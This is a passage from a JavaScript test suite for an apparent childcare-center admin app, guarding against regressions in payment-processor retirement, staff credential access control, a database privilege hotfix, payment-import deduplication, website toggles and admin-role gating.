        expect(doc.includes('STAX_SANDBOX_TEST_ENABLED')).toBe(true);
        expect(doc.includes('create_transaction')).toBe(true);
        // The pin ships in source only — deploying it is its own step, and
        // forgetting it would leave the guard in git and not in production.
        expect(doc.includes('assertStaxMerchant')).toBe(true);
    });
});

describe('Authorize.net is fully retired — one processor, no silent second path', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const exists = rel => fs.existsSync(path.join(repoRoot, rel));

    test('its edge function sources and the iframe relay are gone from the repo', () => {
        ['supabase/functions/create-payment-session',
         'supabase/functions/authorizenet-webhook',
         'supabase/functions/admin-refund-payment',
         'supabase/functions/reconcile-anet-payments',
         'iframe-communicator.html'].forEach(p => expect(exists(p)).toBe(false));
    });

    test('no client code can start or reverse an Authorize.net payment', () => {
        const supabaseJs = read('js/supabase.js');
        expect(supabaseJs.includes('createPaymentSession')).toBe(false);
        expect(supabaseJs.includes('create-payment-session')).toBe(false);
        expect(supabaseJs.includes('admin-refund-payment')).toBe(false);
    });

    test('the CSP no longer frames authorize.net, and _headers still matches worker.js', () => {
        const headers = read('_headers');
        expect(headers.includes('authorize.net')).toBe(false);
        expect(read('worker.js').includes('authorize.net')).toBe(false);
        // The line-length ceiling that broke a Cloudflare deploy once already.
        const cspLine = headers.split('\n').find(l => l.includes('Content-Security-Policy'));
        expect(cspLine.length).toBeLessThan(1950);
    });

    test('the retired reconciliation cron is unscheduled by a committed migration', () => {
        const mig = readMigration('retire_authorizenet_processor');
        expect(mig.includes("cron.unschedule('reconcile-anet-payments')")).toBe(true);
        // reconcile-stax-payments must not be touched by the same migration.
        expect(mig.includes("unschedule('reconcile-stax-payments')")).toBe(false);
    });
});

// ── Staff credentials (CPR/first-aid, TB tests) ─────────────────
// Asked for directly 2026-09-02: staff upload their own certification
// documents from the Account tab; the office reads the same data back in
// HR & Handbook → Credentials. Two real bugs were caught and fixed live
// while building this, before either was ever queried by a real caller —
// both are guarded here so neither can quietly come back.
describe('staff credentials', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');

    // Copy of _scAdminStatus()/scStatus()'s pure logic (admin-safety.js /
    // staff-credentials.js) — both files compute the same four states off a
    // plain DATE string, and this is tested once rather than twice.
    function credentialStatus(expiresAt, todayIso) {
        if (!expiresAt) return 'current';
        const soonBy = new Date(`${todayIso}T00:00:00`);
        soonBy.setDate(soonBy.getDate() + 30);
        const soon = soonBy.toISOString().slice(0, 10);
        if (expiresAt < todayIso) return 'expired';
        if (expiresAt <= soon) return 'soon';
        return 'current';
    }

    test('four states: none is the caller\'s job, not this function\'s', () => {
        expect(credentialStatus(null, '2026-09-02')).toBe('current');       // "on file", no expiry tracked
        expect(credentialStatus('2026-08-01', '2026-09-02')).toBe('expired');
        expect(credentialStatus('2026-09-15', '2026-09-02')).toBe('soon');   // within 30 days
        expect(credentialStatus('2027-01-01', '2026-09-02')).toBe('current');
    });

    // ⚠️ Both status functions originally computed "today" with
    // `new Date().toISOString().slice(0,10)` — the device's UTC date, which
    // in the evening in Central time is already tomorrow. Caught before
    // shipping: re-verify neither file regresses back to it.
    test('neither status function computes "today" in UTC', () => {
        [
            ['js/admin/admin-safety.js', 'function _scAdminStatus'],
            ['js/staff/staff-credentials.js', 'function scStatus'],
        ].forEach(([file, marker]) => {
            const src = read(file);
            const start = src.indexOf(marker);
            expect(start).toBeGreaterThan(-1);
            // A fixed window past the declaration comfortably covers the
            // "today"/"soon" lines without needing to brace-match the
            // function's real end.
            const window = src.slice(start, start + 500);
            expect(window.includes('America/Chicago')).toBe(true);
            expect(window.includes('toISOString().slice(0, 10)')).toBe(false);
        });
    });

    // ⚠️ The live version of this gate was `IF admin_role() <> 'full' THEN
    // RETURN`, which never fires for a caller with NO admin_roles entry at
    // all (a parent's own Supabase Auth session, most notably) — `NULL <>
    // 'full'` is NULL, and `IF NULL THEN` does not take the branch. Verified
    // live against the real database before the COALESCE fix: a rolled-back
    // probe as an unrecognized email got real rows back. Guarded here so the
    // migration file — which a future edit is more likely to touch than the
    // live function — can't drift back to the unsafe form.
    test('admin_list_staff_credentials guards the NULL-admin_role() case', () => {
        const mig = readMigration('add_staff_credentials');
        expect(mig.includes("COALESCE(admin_role(), '') <> 'full'")).toBe(true);
        expect(mig.includes("IF admin_role() <> 'full' THEN")).toBe(false);
    });

    test('the table has no anon/authenticated grant — every access is a SECURITY DEFINER RPC', () => {
        const mig = readMigration('add_staff_credentials');
        expect(mig.includes('REVOKE ALL ON staff_credentials FROM anon, authenticated, PUBLIC')).toBe(true);
    });

    test('a credential is always attributed to the PIN-verified caller, never a client-supplied id', () => {
        const fn = read('supabase/functions/submit-staff-credential/index.ts');
        // Scoped to the actual insert payload, not staff_id_for_pin's own
        // p_staff_id argument (which legitimately carries the raw client
        // value — that's the id being VERIFIED, not the one being trusted).
        const insertBlock = fn.slice(fn.indexOf('.insert({'), fn.indexOf('.select("id")'));
        expect(insertBlock.includes('staff_id: verifiedStaffId')).toBe(true);
        expect(insertBlock.includes('staff_id: staffId')).toBe(false);
    });

    test('an object with no row is rolled back, and a failed insert never leaves an orphan', () => {
        const fn = read('supabase/functions/submit-staff-credential/index.ts');
        expect(fn.includes('storage.from("staff-credentials").remove([path])')).toBe(true);
    });

    test('the storage bucket is private and gated to a full admin only', () => {
        const mig = readMigration('add_staff_credentials');
        expect(mig.includes("'staff-credentials', false")).toBe(true);
        expect(mig.includes("public.admin_role() = 'full'")).toBe(true);
    });
});

// ── SECURITY DEFINER critical hotfix ───────────────────────────
describe('SECURITY DEFINER critical hotfix', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const migration = readMigration('security_definer_critical_hotfix');
    const uncommented = migration
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .replace(/^\s*--.*$/gm, '');

    test('the migration is atomic and privileged functions use a fixed empty search path', () => {
        expect(/^\s*BEGIN;/m.test(uncommented)).toBe(true);
        expect(/COMMIT;\s*$/.test(uncommented)).toBe(true);
        expect((uncommented.match(/SET search_path = ''/g) || []).length).toBe(3);
        expect(uncommented.includes('public.is_admin()')).toBe(true);
        expect((uncommented.match(/public\.staff_id_for_pin\(p_staff_id, p_pin\)/g) || []).length).toBe(2);
    });

    test('the unsafe bare-PIN overloads are removed, not left callable', () => {
        expect(uncommented.includes('DROP FUNCTION IF EXISTS public.list_my_time_off_requests(integer);')).toBe(true);
        expect(uncommented.includes('DROP FUNCTION IF EXISTS public.submit_time_off_request(integer, date[], boolean, text, text);')).toBe(true);
        expect(uncommented.includes('list_my_time_off_requests(p_staff_id uuid, p_pin integer)')).toBe(true);
        expect(uncommented.includes('p_staff_id  uuid')).toBe(true);
        expect(/FROM\s+staff\s+s[\s\S]*crypt\(p_pin::text/.test(uncommented)).toBe(false);
    });

    test('new PIN-gated functions revoke PUBLIC and expose only the intended kiosk roles', () => {
        expect(uncommented.includes('REVOKE ALL ON FUNCTION public.list_my_time_off_requests(uuid, integer) FROM PUBLIC;')).toBe(true);
        expect(uncommented.includes('GRANT EXECUTE ON FUNCTION public.list_my_time_off_requests(uuid, integer) TO anon, authenticated;')).toBe(true);
        expect(uncommented.includes('REVOKE ALL ON FUNCTION public.submit_time_off_request(uuid, integer, date[], boolean, text, text) FROM PUBLIC;')).toBe(true);
        expect(uncommented.includes('GRANT EXECUTE ON FUNCTION public.submit_time_off_request(uuid, integer, date[], boolean, text, text) TO anon, authenticated;')).toBe(true);
    });

    test('the browser always supplies the selected staff id to the time-off RPC', () => {
        const sb = read('js/supabase.js');
        const staff = read('js/staff/staff-schedule.js');
        const submit = sb.slice(sb.indexOf('async function submitTimeOffRequestByPin'), sb.indexOf('async function fetchMyStaffSchedule'));
        const list = sb.slice(sb.indexOf('async function listMyTimeOffRequests'), sb.indexOf('// ADMIN ROLES'));
        expect(submit.includes('p_staff_id:  staffId')).toBe(true);
        expect(list.includes('p_staff_id: staffId')).toBe(true);
        expect(staff.includes('staffId: slStaffId')).toBe(true);
    });
});

// ---- Summary ----

// ── Cost to add staff (Daily Staffing Requirement) ──────────────
// ⚠️ These sit ABOVE the summary line on purpose — this file prints its
// results and calls process.exit(1) below, so a describe block appended
// after it runs, prints ticks, and cannot fail CI.
describe('cost to add staff', () => {
    const portal = fs.readFileSync(path.join(__dirname, '../admin/admin-portal.js'), 'utf8');
    const html   = fs.readFileSync(path.join(__dirname, '../../admin.html'), 'utf8');
    const block  = portal.slice(portal.indexOf('// Cost to add staff — Day / Week'),
                                portal.indexOf('// Shared header cards'));

    test('reads assigned staff from the same grid Save writes', () => {
        // Any second source and the coverage bars could show a staffing
        // level that disagrees with what saveStaffSchedule() would persist.
        expect(!!(block.includes('_readAssignmentsFromDOM('),
            'apCostRender must read assignments through _readAssignmentsFromDOM()')).toBe(true);
        expect(!!(!/from\(['"]staff_schedules['"]\)/.test(block))).toBe(true);
    });

    test('prices a hire from the app’s own shift length, not the mockup’s', () => {
        // The design mockup drew AM 7A-1P / PM 1P-5:30P (6h / 4.5h). The app
        // actually schedules 5h / 5h and renderScheduleByWorker() already
        // prints per-person cost from SCHED_SHIFT_HOURS — two shift lengths
        // in one tool is exactly the drift this repo keeps paying for.
        expect(!!(block.includes('SCHED_SHIFT_HOURS'))).toBe(true);
        expect(!!(!/\b6\s*\*\s*wage|\b4\.5\b/.test(block))).toBe(true);
    });

    test('an unassigned week is not reported as a staffing crisis', () => {
        // Nobody assigned yet and "assigned = 0" are the same DOM state, and
        // only one of them is a problem. Until something is assigned the
        // block shows the requirement, with no deficit styling.
        expect(!!(block.includes('anyAssigned'))).toBe(true);
        expect(!!(/No one is assigned for this week yet/.test(block))).toBe(true);
    });

    test('lives in its own container, outside the block that is wiped each render', () => {
        // apRenderStaffReq() replaces #staffReqBody's innerHTML every render;
        // nesting this inside it would destroy the delegated listener.
        expect(!!(html.includes('id="staffCostAddBody"'))).toBe(true);
        const req  = html.indexOf('id="staffReqBody"');
        const cost = html.indexOf('id="staffCostAddBody"');
        expect(!!(req > -1 && cost > req)).toBe(true);
        expect(!!(block.includes("getElementById('staffCostAddBody')"))).toBe(true);
    });

    test('both views exist and the toggle switches between them', () => {
        expect(!!(block.includes('function apCostDayView'))).toBe(true);
        expect(!!(block.includes('function apCostWeekView'))).toBe(true);
        expect(!!(/data-ap-cost-view="day"/.test(block) && /data-ap-cost-view="week"/.test(block))).toBe(true);
        expect(!!(/data-ap-cost-view\]/.test(block), 'wired by delegation off the data attribute')).toBe(true);
    });

    test('carries no inline event-handler attribute', () => {
        // script-src is locked to a hash allowlist with no 'unsafe-inline';
        // an onclick= here would simply not fire in a browser.
        expect(!!(!/\son(click|change|input|blur|keydown)\s*=/.test(block))).toBe(true);
    });
});

// ============================================================
// Payment import dedup + coverage (center_payment_coverage.sql)
// ============================================================
describe('payment import duplicate guard and coverage', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const billing = read('js/admin/admin-billing.js');
    const hub = read('js/admin/admin-finance-hub.js');
    const coverage = readMigration('center_payment_coverage');

    test('a re-imported ProCare row is skipped, not inserted twice', () => {
        // A doubled payment inflates a family's childcare statement, which is
        // filed with the IRS, and nothing downstream would flag it.
        expect(billing.includes('_procareDupKey')).toBe(true);
        expect(/r\.alreadyImported = true/.test(billing)).toBe(true);
        // The guard is on the IMPORT, not only the preview count.
        expect(/const valid = rows\.filter\(r => r\.familyId && !r\.alreadyImported/.test(billing)).toBe(true);
    });

    // ⚠️ The fingerprint deliberately excludes the description, as of
    // 2026-08-31. ProCare writes different description text depending on which
    // report the office exports: measured against a real re-export of months
    // already imported, family+date+amount+description recognized 15 of 516
    // overlapping rows, family+date+amount recognized 454. Keying on the
    // description would have re-imported 439 recorded payments.
    test('the fingerprint is family+date+amount, and never the description', () => {
        const src = extractFunction(billing, '_procareDupKey');
        ['family_id', 'payment_date', 'amount'].forEach(f => {
            expect(src.includes('p.' + f)).toBe(true);
        });
        expect(src.includes('p.note')).toBe(false);
        // Amounts compare at 2dp — the sheet gives a float, the column is numeric.
        expect(src.includes('toFixed(2)')).toBe(true);
    });

    test('a payment already recorded is recognized even though the description differs', () => {
        // The exact shape that defeated the old key: same family, same day,
        // same amount, two different ProCare report wordings.
        const stored = [{ family_id: 'fam-1', payment_date: '2026-03-15', amount: 460,
                          note: 'Online Payment By Parent: K...' }];
        const counts = _procareDupCounts(stored);
        const fileRow = { family_id: 'fam-1', payment_date: '2026-03-15', amount: 460,
                          note: 'By Kristine Hernandez. Last 4: 2352' };
        expect(counts.get(_procareDupKey(fileRow))).toBe(1);
    });

    test('matching is by count, so a genuine second same-day payment still imports', () => {
        // One stored, two in the file: exactly one is a duplicate. A Set-based
        // guard would have marked both and silently dropped a real payment.
        const counts = _procareDupCounts([
            { family_id: 'fam-1', payment_date: '2026-07-02', amount: 60 },
        ]);
        const rows = [
            { family_id: 'fam-1', payment_date: '2026-07-02', amount: 60 },
            { family_id: 'fam-1', payment_date: '2026-07-02', amount: 60 },
        ];
        const flagged = rows.map(r => {
            const k = _procareDupKey(r);
            const left = counts.get(k) || 0;
            if (left > 0) { counts.set(k, left - 1); return true; }
            return false;
        });
        expect(flagged[0]).toBe(true);
        expect(flagged[1]).toBe(false);
    });

    test('a different family on the same day and amount is never a duplicate', () => {
        const counts = _procareDupCounts([
            { family_id: 'fam-1', payment_date: '2026-07-02', amount: 60 },
        ]);
        expect(counts.get(_procareDupKey(
            { family_id: 'fam-2', payment_date: '2026-07-02', amount: 60 })) || 0).toBe(0);
    });

    test('the import consumes the tally rather than testing membership', () => {
        // The count-aware path has to be the one that actually runs.
        expect(billing.includes('_procareDupCounts(existing)')).toBe(true);
        expect(/remaining\.set\(k, left - 1\)/.test(billing)).toBe(true);
        expect(billing.includes('new Set(existing.map(_procareDupKey))')).toBe(false);
    });

    test('a failed duplicate check warns instead of importing unguarded', () => {
        // Set AND surfaced. A flag with no consumer is the FS29 mistake.
        expect(billing.includes('dupCheckFailed = true')).toBe(true);
        expect(/dupCheckFailed\)[\s\S]{0,200}duplicate check could not run/.test(billing)).toBe(true);
    });

    test('coverage uses the statement\'s own care-day definition', () => {
        // If these drift, the card calls a month fine while the statement
        // refuses it — the worst of both.
        expect(/waitlisted is not true/.test(coverage)).toBe(true);
        expect(/r\.status <> 'cancelled'/.test(coverage)).toBe(true);
        expect(/where is_admin\(\)/.test(coverage)).toBe(true);
        expect(/revoke all on function public\.center_payment_coverage\(date, date\) from public, anon/.test(coverage)).toBe(true);
    });

    test('the coverage card flags only months that actually block a statement', () => {
        // Care on record and nothing received. A month with neither is just a
        // month the center was closed.
        expect(/care_days \|\| 0\) > 0 && \(m\.payments \|\| 0\) === 0/.test(hub)).toBe(true);
        // Recording a payment must drop the cache, or the gap shows as stale.
        expect(hub.includes('_fhCoverageInvalidate();')).toBe(true);
    });

    // ⚠️ Added 2026-09-02: the September pilot only invoices 4-5 test
    // families on purpose, so most registered families' care days will
    // never show a payment until the office opens billing to more of the
    // center. The banner's own assumption didn't account for that.
    test('a configured coverage start month suppresses earlier gaps, unset suppresses nothing', () => {
        const gatesAt = hub.indexOf('const gaps = _fhCoverage.filter(m =>');
        expect(gatesAt).toBeGreaterThan(-1);
        const gateBody = hub.slice(gatesAt, hub.indexOf(';', gatesAt));
        expect(gateBody.includes('!startMonth || m.month >= startMonth')).toBe(true);
        // Default (unset) must not silently disable the warning for every
        // center that never opts in — the read falls back to null/no-op.
        expect(hub.includes("fetchSetting('billing_coverage_start_month')")).toBe(true);
        expect(hub.includes('_fhCoverageStart = null;')).toBe(true);
    });

    test('the coverage start-month setting persists through the generic settings table, not a new one', () => {
        const saveAt = hub.indexOf('async function _fhSaveCoverageStartMonth');
        const body = hub.slice(saveAt, hub.indexOf('\n}', saveAt));
        expect(body.includes("upsertSetting('billing_coverage_start_month', value || null)")).toBe(true);
    });

    test('a suppressed gap never suppresses family_care_statement\'s own per-family refusal', () => {
        // The pilot setting lives entirely in admin-finance-hub.js; the
        // statement's own refusal logic must not reference it at all — a
        // real family's real statement must never say a number that's short.
        const stmtFn = readMigration('family_care_statement');
        expect(stmtFn.includes('billing_coverage_start_month')).toBe(false);
    });

    // ⚠️ Found 2026-09-02: computeBillMonthExceptions()/_fhLoad() only
    // refetch allFamiliesData/allRegistrations if those shared globals are
    // EMPTY — correct for an edit made from inside this tool (admin-calendar.js
    // updates them in place, so that stays live with no refetch needed), but
    // wrong for a registration a PARENT submitted, or an edit a DIFFERENT
    // admin made, while her tab sat open on some other section. A director
    // asked directly whether she'd ever have to manually refresh the browser
    // before trusting the Ledger — the answer needed to become "no."
    test('_fhRefreshData nulls both shared globals before reloading, never trusts a stale in-memory cache', () => {
        const start = hub.indexOf('async function _fhRefreshData');
        const body = hub.slice(start, hub.indexOf('\n}', start));
        const nullAt = body.indexOf('allFamiliesData = null;');
        const loadAt = body.indexOf('await _fhLoad();');
        expect(nullAt).toBeGreaterThan(-1);
        expect(body.includes('allRegistrations = null;')).toBe(true);
        // Must null BEFORE loading, or the fetch-if-empty guard downstream
        // still finds a (soon to be stale) array and skips the real fetch.
        expect(loadAt).toBeGreaterThan(nullAt);
    });

    test('entering the Ledger tool always calls the live refresh, not a raw _fhLoad that could hit a stale cache', () => {
        const start = hub.indexOf('async function renderFinanceHubTool');
        const body = hub.slice(start, hub.indexOf('\n}\n', start));
        expect(body.includes('await _fhRefreshData();')).toBe(true);
    });

    // ⚠️ Found while adding the Refresh button: the "Retry charge" label on a
    // declined-card row promised a charge retry that never happened —
    // _fhRemindOne() has only ever sent the same push reminder regardless of
    // dispStatus, no matter which label the button carried. Currently
    // unreachable (card_declined is hardcoded to 0, no decline signal wired
    // up yet), but a landmine for whenever it is. Fixed to describe the real
    // action instead of removing the false promise only where it happened to
    // be visible today.
    test('every button that emails or notifies a family says so in its own label or title, not just a confirm dialog', () => {
        expect(hub.includes('Email ${drafted.length} invoice')).toBe(true);
        expect(hub.includes('title="Recomputes and emails every invoice above to its family')).toBe(true);
        expect(hub.includes('title="Sends each family a push notification about their balance. Not an email."')).toBe(true);
        expect(hub.includes('title="Emails this family their invoice.">Email invoice</button>')).toBe(true);
        expect(hub.includes('title="Emails this family their invoice now.">')).toBe(true);
        expect(hub.includes('title="Sends this family a push notification about their balance. Not an email.">Notify</button>')).toBe(true);
        // The old false promise must not survive anywhere in this file.
        expect(hub.includes('Retry charge')).toBe(false);
        expect(hub.includes('Retries the charge on file')).toBe(false);
    });

    test('the Refresh control is purely internal — reloads data, never emails, pushes, or notifies', () => {
        const htmlSrc = read('admin.html');
        expect(htmlSrc.includes('id="fhRefreshBtn"')).toBe(true);
        expect(htmlSrc.includes('Does not email or notify anyone')).toBe(true);
        const bindAt = hub.indexOf("_fhEl('fhRefreshBtn')?.addEventListener");
        expect(bindAt).toBeGreaterThan(-1);
        const bindBody = hub.slice(bindAt, hub.indexOf('});', bindAt) + 3);
        expect(bindBody.includes('_fhRefreshData()')).toBe(true);
        // No sending function may appear in the same handler.
        expect(/emailInvoices|_woSendPush|insertNudge|reconcileBillingInvoice/.test(bindBody)).toBe(false);
    });
});

// ============================================================
// MDO WEBSITE CONTENT
// ============================================================
// ⚠️ This block must stay ABOVE the results summary below — the suite prints
// its totals and calls process.exit() at the end of the file, so anything
// appended after it runs, prints ticks, and can never fail CI.
describe('MDO website — the seasonal switches, and what they may not write', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const editor = read('js/admin/admin-mdo-website.js');
    const worker = read('worker.js');
    const indexHtml = read('index.html');

    // Comments are stripped before every absence check below. This file's own
    // header names the keys it deliberately does NOT write, and a naive
    // substring search reads that warning as a violation of itself — the exact
    // way three guards in this suite first failed against already-correct code.
    const code = editor.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');

    // ⚠️ Shared with billing and scheduling. A second editor for any of these
    // is a second source of truth for numbers the invoice path reads.
    test('the screen never writes rates, capacity, ratios or the staff directory', () => {
        ['room_rates', 'room_capacity', 'staff_ratios', 'staff_directory',
         'registration_fee', 'new_family_fee'].forEach((key) => {
            expect(code.includes(key)).toBe(false);
        });
    });

    // ⚠️ THE POINT OF THE MIRROR LIST. These two switches already have a
    // control on the Settings screen. This screen shows their live state and
    // links there; the moment it also WRITES one, the two forms can disagree
    // about the same key, which is how a switch starts lying.
    test('a key owned by another screen is read, never written', () => {
        ['hide_summer_camp', 'enrollment_at_capacity'].forEach((key) => {
            expect(code.includes(key)).toBe(true);              // shown
            expect(new RegExp(`upsertSetting\\(\\s*['"]${key}`).test(code)).toBe(false);
        });
        // Only a key from MDO_SITE_TOGGLES ever reaches a write, and that
        // write reads its key off the checkbox rather than naming one.
        const saves = code.match(/upsertSetting\([^)]*\)/g) || [];
        expect(saves.length).toBe(1);
        expect(saves[0]).toBe('upsertSetting(key, want)');
    });

    test('the mirrored switches carry no checkbox of their own', () => {
        const mirrors = code.slice(code.indexOf('MDO_SITE_MIRRORS'), code.indexOf('function _mdoIsOn'));
        expect(mirrors.includes('data-mdo-toggle')).toBe(false);
    });

    // ⚠️ THE CROSS-FILE PAIR THAT ACTUALLY BREAKS SILENTLY. The worker targets
    // these two elements by id; rename one in index.html and the switch stops
    // working with nothing to see — the page just keeps showing the block.
    test('every id the worker hides really exists on the public page', () => {
        const targeted = [...worker.matchAll(/\.on\('#(mdo[A-Za-z]+)'/g)].map(m => m[1]);
        expect(targeted.sort().join(',')).toBe('mdoBannerStrip,mdoSummerBlock');
        targeted.forEach((id) => expect(indexHtml.includes(`id="${id}"`)).toBe(true));
    });

    test('the worker asks for both switch keys', () => {
        const keys = worker.match(/const keys = '([^']+)'/)[1].split(',');
        expect(keys.includes('hide_summer_camp')).toBe(true);
        expect(keys.includes('mdo_hide_banner')).toBe(true);
    });

    // ⚠️ FAIL OPEN. Absent, unreadable, or anything but a true means the block
    // renders. A Supabase outage must leave the page as it is rather than
    // quietly stripping sections out of the church's own marketing page.
    test('only an explicit true hides a block', () => {
        const state = worker.slice(worker.indexOf('hideSummer:'), worker.indexOf('hideBanner:') + 200);
        expect(state.includes("byKey.hide_summer_camp === true || byKey.hide_summer_camp === 'true'")).toBe(true);
        expect(state.includes("byKey.mdo_hide_banner  === true || byKey.mdo_hide_banner  === 'true'")).toBe(true);
        // The handlers act on the true, never on the absence.
        expect(worker.includes('if (state.hideSummer) el.remove();')).toBe(true);
        expect(worker.includes('if (state.hideBanner) el.remove();')).toBe(true);
    });

    // The three-section content editor is retired — see the migration. A
    // leftover call would be a call to a function the database no longer has.
    test('nothing calls the retired content RPCs any more', () => {
        ['mdo_public_content', 'admin_mdo_content', 'admin_mdo_save_draft', 'admin_mdo_publish',
         'admin_mdo_discard_draft', 'admin_mdo_revisions', 'admin_mdo_restore_revision'].forEach((fn) => {
            expect(read('js/supabase.js').includes(fn)).toBe(false);
            expect(code.includes(fn)).toBe(false);
        });
        expect(read('js/app.js').includes('renderMdoSiteContent')).toBe(false);
    });
});

describe('Admin users — only real admins, and all of them', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    // ⚠️ Strip comments before asserting anything ABSENT. Every comment here
    // names the defect it is guarding against — "listUsers() with no
    // arguments", "not on `batch.length < PER_PAGE`", "a plain roles[email]
    // lookup" — so a bare grep matches the explanation and reports the bug is
    // still present in code that is already fixed.
    const strip = src => src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
    const fn   = strip(read('supabase/functions/admin-users/index.ts'));
    const core = strip(read('js/admin/admin-core.js'));
    const sb   = strip(read('js/supabase.js'));
    const settings = strip(read('js/admin/admin-settings.js'));

    // The bug: listUsers() with no arguments is page 1 of 50, newest first.
    // There are 224 Auth accounts (every family has had a real login since
    // parent_portal_option_b_accounts) and the four actual admins are the
    // OLDEST of them, at positions 220-224 — so not one of them was ever in
    // the only page fetched, and the screen read "No admin users found" while
    // all four were signing in daily.
    test('the account list is paged, never a bare listUsers()', () => {
        expect(/listUsers\(\s*\)/.test(fn)).toBe(false);
        expect(/listUsers\(\{\s*page,\s*perPage:/.test(fn)).toBe(true);
        expect(/for \(let page = 1; page <= MAX_PAGES; page\+\+\)/.test(fn)).toBe(true);
    });

    // ⚠️ Stopping on a short page is the trap: GoTrue may cap per_page below
    // what we asked for, and a first page shorter than PER_PAGE would then
    // read as "that's everyone" and truncate the list — the same defect,
    // reintroduced by the fix for it.
    test('paging stops on no new ids, not on a short page', () => {
        expect(fn.includes('if (fresh === 0) break;')).toBe(true);
        expect(/batch\.length\s*<\s*PER_PAGE/.test(fn)).toBe(false);
    });

    // The 220+ family logins must not leave the server. Rendering them gave
    // every parent's email a role <select> defaulting to "Full Access" and a
    // Delete button wired to their real Auth account.
    test('only accounts present in admin_roles are returned', () => {
        expect(/const roleEmails = new Set\(/.test(fn)).toBe(true);
        expect(fn.includes('if (!roleEmails.has((u.email || "").toLowerCase().trim())) continue;')).toBe(true);
        // ...and the browser filters again, so a stale deployment of this
        // function cannot put a family's account back on the screen.
        expect(settings.includes('roleEmails.has((u.email || \'\').toLowerCase().trim())')).toBe(true);
    });

    // ⚠️ Somebody with no entry in admin_roles is not an admin AT ALL. This
    // used to fall through to 'staff' — a real admin-portal role — so a parent
    // opening admin.html got the admin shell. Every query behind it was
    // refused by RLS, but a panel that renders for a parent is not "not an
    // admin".
    test('a session with no admin role is turned away, not demoted to staff', () => {
        expect(/async function ensureAdminSession\(\)/.test(core)).toBe(true);
        expect(core.includes('if (!role) {')).toBe(true);
        expect(/_refuseAdmin\(/.test(core)).toBe(true);
        // The refusal really signs out and restores the login screen.
        const refuse = core.slice(core.indexOf('async function _refuseAdmin'));
        expect(refuse.includes('await logoutAdmin();')).toBe(true);
        expect(refuse.includes("getElementById('dashboard').classList.add('hidden')")).toBe(true);
    });

    test('the gate runs before the dashboard is ever revealed', () => {
        const body = core.slice(core.indexOf('async function showDashboard()'));
        const gate = body.indexOf('ensureAdminSession()');
        const show = body.indexOf("getElementById('dashboard').classList.remove('hidden')");
        expect(gate).toBeGreaterThan(-1);
        expect(show).toBeGreaterThan(-1);
        expect(gate < show).toBe(true);
    });

    // ⚠️ "Could not ask" is not "you are nobody" — the two must stay separable,
    // or a dropped request reads as a parent and a real admin is locked out.
    test('an unreadable answer is distinguished from a refusal', () => {
        expect(/return \{ ok: false, role: null \}/.test(sb)).toBe(true);
        expect(/return \{ ok: true, role \}/.test(sb)).toBe(true);
        expect(core.includes('if (!ok) {')).toBe(true);
    });

    // The browser asks admin_role() — the same SECURITY DEFINER function every
    // RLS policy calls — instead of re-deriving the role from the settings map,
    // so the screen and the policies cannot disagree about who is privileged.
    test('the role comes from the database, and the map match is case-insensitive', () => {
        expect(/sbClient\.rpc\('admin_role'\)/.test(sb)).toBe(true);
        const apply = core.slice(core.indexOf('async function applySessionRole()'));
        expect(/roles\[email\]/.test(apply)).toBe(false);
        expect(apply.includes("k.toLowerCase().trim() === email")).toBe(true);
        expect(apply.includes('window._dbAdminRole || mapped')).toBe(true);
    });
});

// ============================================================
// FILL THE ROOMS — seat math and funnel
// (design handoff: Capacity & Fill, turn 1)
// ============================================================
// Unlike most of this file, these exercise the REAL shipped functions rather
// than a stub that mirrors them: admin-fill-rooms.js declares only functions
// and a couple of consts at the top level — nothing runs on load — so the
// whole module can be evaluated in a vm sandbox with the browser globals it
// calls at render time stubbed in. A regression in the seat/at-ratio rule
// therefore fails here, which a source-text assertion could not catch.
describe('Fill the Rooms — open seats, at-ratio, and the funnel', () => {
    const vm = require('vm');
    // Each describe block in this file scopes its own repoRoot — see the two
    // above — rather than sharing one, so a block can be moved or removed
    // without silently breaking its neighbours.
    const repoRoot = path.resolve(__dirname, '..', '..');
    const src = fs.readFileSync(path.join(repoRoot, 'js/admin/admin-fill-rooms.js'), 'utf8');

    // Two rooms with deliberately different ratios, so "at ratio" can be
    // wrong for one and right for the other in the same week.
    const stubRooms = [
        { id: 'turtle', label: '🐢 Turtle Room', capacity: 11, staffRatio: 8, status: 'active', hidden: false },
        { id: 'goose',  label: '🪿 Goose Room',  capacity: 12, staffRatio: 8, status: 'active', hidden: false },
    ];
    const WEEK = ['2026-09-14', '2026-09-15', '2026-09-16', '2026-09-17', '2026-09-18'];

    // n children booked into `room` on `date`, as the registration shape
    // allRegistrations actually carries.
    function regs(spec) {
        return Object.entries(spec).map(([roomId, byDate]) => ({
            room_id: roomId,
            registration_dates: Object.entries(byDate).flatMap(([date, n]) =>
                Array.from({ length: n }, () => ({ care_date: date, waitlisted: false, day_type: 'full' }))),
        }));
    }

    function load({ registrations = [], closures = [], apps = [] } = {}) {
        const sandbox = {
            console,
            apWeekDates: () => WEEK.slice(),
            apWeekStart: () => WEEK[0],
            apFmtDayShort: (d) => ({ '2026-09-14': 'Mon 9/14', '2026-09-15': 'Tue 9/15',
                '2026-09-16': 'Wed 9/16', '2026-09-17': 'Thu 9/17', '2026-09-18': 'Fri 9/18' })[d] || d,
            getSortedRooms: () => stubRooms,
            allRegistrations: registrations,
            allClosureDates: new Set(closures),
            _allWaitlistApps: apps,
            TREND_DAYS: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri'],
            escHtml: (s) => String(s),
            wlRoomLabel: (id) => id,
            wlDaysLabel: () => 'Tue/Thu',
            wlDeriveRoom: (a) => a.room_id || 'turtle',
            wlDaysWaiting: () => '10 days',
            wlpMonths: () => [],
            wlpRankedKids: () => [],
        };
